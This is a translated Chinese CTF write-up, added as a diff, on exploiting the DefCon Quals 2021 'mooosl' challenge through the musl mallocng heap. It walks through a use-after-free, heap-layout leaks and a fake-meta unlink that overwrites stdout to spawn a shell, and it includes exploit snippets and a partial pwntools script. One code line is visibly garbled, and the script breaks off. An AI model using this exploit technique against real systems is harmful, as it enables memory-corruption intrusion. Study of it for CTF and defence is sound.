@@ -1,0 +1,138 @@
+# 借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+上篇我们大致过了一遍musl libc
+1.2.2的mallocng源码，了解到musl堆管理器用以下的结构管理着meta、group以及chunk。本篇我们继续来分析mooosl这道题的解题思路。
+## 静态分析
+保护全开
+程序主要提供了`store`、`query`、`delete`这几个功能，下面逐个功能进行分析
+sotre，申请0x30的chunk，用于存放key、value以及对应的size，另外还会算出hash和prev_hash_map（保存着hash_map先前在该处的指针）
+set_key和set_value，比较类似，根据输入的size去申请chunk，然后填入key和value，所以store方法一共会申请3个chunk
+get_hash，返回一个hash值，返回后只取低12位，根据这个hash得到hash_map[hash&0xfff]，先将hash_map[hash&0xfff]原有的值保存在prev_hash_map，然后将0x30
+chunk的地址存入hash_map[hash&0xfff]
+query，查询功能，根据输入的key，找到对应的value并以hex字符串形式输出。注意到这里调了set_key，会先申请chunk用于存放key，最后再free掉。
+查找过程是遍历hash_map找到对应key，如果prev_hash_map不为零，则会打印出prev_hash_map的数据
+delete，删除功能，如果从hash_map中找到对应的key，则会从free掉对应的3个chunk，最后再free掉调set_key时产生的chunk。另外，如果prev_hash_map不为0，则会将hash_map[hash&0xfff]置为prev_hash_map后再free掉prev_hash_map所指向的chunk。
+很明显，如果hash_map[hash&0xfff]的原有的值为0，则delete后会将hash_map[hash&0xfff]清0，可通过连续store两次相同hash去绕过。而且，在上一篇文章中我们了解到musl
+libc在free掉一个chunk时不会讲user data域置。所以，当绕过了`*v2 = (struct_v1
+*)ptr->prev_hash_map`之后，就相当于有了一个uaf漏洞。
+## Leak libc
+知道了musl堆的重分配机制，泄露内存地址的思路就比较清晰了
+group对chunk的管理策略：  
+1.chunk按照内存先后，依次分配；  
+2.free掉的chunk不能马上分配；  
+3.需要等group内所有chunk都处于freed或者used状态时，才会将freed状态的chunk转换成avaliable；  
+4.分配chunk时，会将user data域用\x00初始化。
+采取的堆风水策略  
+1.先store一次垫着group header防止free掉group所有chunk时，将整个group内存归还给堆管理器；  
+2.除最后一个与第一个chunk，其余全部free掉；  
+3.申请一个`\n` struct chunk（这个chunk存放着key value指针），这时候key chunk和value
+chunk便会落在struct chunk的内存之前，value chunk与struct chunk相同size；  
+4.free掉struct chunk，然后再free掉group内除第一个的所有chunk，再申请一个struct chunk（key value
+chunk size不为0x30）  
+5.这时，这个struct chunk便落在`\n` struct chunk的value chunk域内，通过query(‘\n’)便可打印出内存信息。
+    ###Info Leak
+    store('A', 'A')#AAAAAAU
+    #clear for reusing freed chunks
+    for _ in range(5):
+        query('A' * 0x30)#AFFFFFU
+    store('\n', 'A' * 0x30)#UAAAAAU -> UAAAA[U]U #0x4040+0x7e5*8 = 0x7f68   []就是要控的chunk
+    store(find_key(), 'A')#UAAAU[U]U
+    delete('\n')#FAAAU[F]U
+    #clear for reusing freed chunks
+    for _ in range(3):
+        query('A' * 0x30)#FFFFU[F]U
+    store('A\n', 'A', 0x1200)#FFFFU[U]U 现在[U] chunk存放了key_ptr与value_ptr
+    query('\n')
+继续利用该策略将libc基地址等内存信息leak出来
+## 从musl unlink到FSOP
+利用meta dequeue方法的unlink漏洞可以达到任意写的效果
+注意到nontrivial_free方法，当g->freed_mask | g->avail_mask为0时，也就是当所有块都在使用中，这时可以引入next
+meta和group进行块处理。也就是可以引用fake meta，并通过其返回任意地址。
+构造一个fake meta，数据结构需要符合get_meta方法
+    # Overwrite stdout-0x10 to fake_meta_addr using dequeue during free
+    sc = 8 # 0x90
+    freeable = 1
+    last_idx = 0
+    maplen = 1
+    fake_meta = b''
+    fake_meta += p64(stdout - 0x18) # prev
+    fake_meta += p64(fake_meta_addr + 0x30) # next
+    fake_meta += p64(fake_mem_addr) # mem
+    fake_meta += p32(0) + p32(0) # avail_mask, freed_mask
+    fake_meta += p64((maplen prev = &(stdout-0x10)`处写入fake_mem的地址
+通过queue方法令fake meta进入ctx.active列表
+`sc=0x8`的group已经由fake meta进行管理
+现在可以随意修改fake_meta的fake_mem，令其指向`stdout-0x10`
+申请size
+0x80的chunk，便会将`stdout-0x10`分配回来。然后覆盖stdout->write函数指针为system，在stdout->flags写入`/bin/sh\x00`，并且保证`stdin->wpos
+!= stdin->wbase`
+getshell~
+## Script
+完整EXP
+    #! /usr/bin/env python
+    # -*- coding: utf-8 -*-    
+    from pwn import *
+    import codecs
+    context.terminal = ['terminator', '--new-tab', '-x']
+    #context.terminal = ['terminator', '-x', 'sh', '-c']
+    context.log_level = 'debug'
+    context.arch = 'amd64'
+    DEBUG = 1
+    TARGET = './mooosl'
+    LIBCSO = './libc.so'
+    #LIBCSO = '/lib/x86_64-linux-musl/libc.so'
+    #LIBCSO = './libc.so'
+    #LIBCSO = '/mnt/hgfs/sharefd/envs/musl/1.2.2/local.x64/lib/x86_64-linux-musl/libc.so'
+    MODULE = LIBCSO
+    GLOBAL = '''
+    mcinit -a 1.2.2
+    b dequeue
+    b queue
+    p __malloc_context
+    '''
+    tube.s = tube.send
+    tube.sl = tube.sendline
+    tube.sa = tube.sendafter
+    tube.sla = tube.sendlineafter
+    tube.r = tube.recv
+    tube.ru = tube.recvuntil
+    tube.rl = tube.recvline
+    tube.ra = tube.recvall
+    tube.rr = tube.recvregex
+    tube.irt = tube.interactive
+    if DEBUG == 0:
+        p = process(TARGET)
+        text_base = int(os.popen("pmap {} | grep {} | awk '{{print $1}}'".format(p.pid, TARGET.split('/')[-1])).readlines()[1], 16)
+        libs_base = int(os.popen("pmap {} | grep {} | awk '{{print $1}}'".format(p.pid, MODULE.split('/')[-1])).readlines()[0],16)
+    elif DEBUG == 1:
+        p = process(TARGET, env={'LD_PRELOAD' : './libc.so.6'})
+        text_base = int(os.popen("pmap {} | grep {} | awk '{{print $1}}'".format(p.pid, TARGET.split('/')[-1])).readlines()[1], 16)
+        libs_base = int(os.popen("pmap {} | grep {} | awk '{{print $1}}'".format(p.pid, MODULE.split('/')[-1])).readlines()[0],16)
+    elif DEBUG == 2:
+        p = remote('mooosl.challengep.ooo', 23333)
+    elif DEBUG == 3:
+        r = ssh(host=host, user='username', password='passwd')
+        p = r.shell()
+    elf = ELF(TARGET)
+    libc = ELF(LIBCSO)
+    def debug(addr = 0):
+        if addr != 0:
+            gdb.attach(p, 'b *{}{}'.format(hex(addr), GLOBAL))
+        else:
+            gdb.attach(p, '{}'.format(GLOBAL))
+    def store(key_content, value_content, key_size=None, value_size=None, wait=True):
+        p.sendlineafter('option: ', '1')
+        if key_size is None:
+            key_size = len(key_content)
+        p.sendlineafter('size: ', str(key_size))
+        p.sendafter('content: ', key_content)
+        if value_size is None:
+            value_size = len(value_content)
+        p.sendlineafter('size: ', str(value_size))
+        if wait:
+            p.recvuntil('content: ')
+        p.send(value_content)
+    def query(key_content, key_size=None, wait=True):
+        p.sendlineafter('option: ', '2')
